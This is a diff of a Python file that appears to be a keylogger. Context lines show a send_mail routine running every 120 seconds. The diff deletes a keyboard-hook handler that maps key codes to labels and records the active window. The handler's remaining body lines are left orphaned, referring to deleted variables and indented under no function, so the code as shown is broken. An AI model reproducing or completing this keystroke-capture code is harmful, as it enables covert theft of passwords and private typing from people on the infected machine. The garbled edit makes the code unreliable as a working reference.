@@ -65,29 +65,7 @@ def send_mail():
         sleep(120)
 
 
-def pushing(event):
-    global data, lastWindow
-    window = event.WindowName
-    keys = {
-            13: ' [ENTER] ',
-            8: ' [BACKSPACE] ',
-            162: ' [CTRL] ',
-            163: ' [CTRL] ',
-            164: ' [ALT] ',
-            165: ' [ALT] ',
-            160: ' [SHIFT] ',
-            161: ' [SHIFT] ',
-            46: ' [DELETE] ',
-            32: ' [SPACE] ',
-            27: ' [ESC] ',
-            9: ' [TAB] ',
-            20: ' [CAPSLOCK] ',
-            38: ' [UP] ',
-            40: ' [DOWN] ',
-            37: ' [LEFT] ',
-            39: ' [RIGHT] ',
-            91: ' [SUPER] '
-            }
+
     keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
     if window != lastWindow:
         lastWindow = window
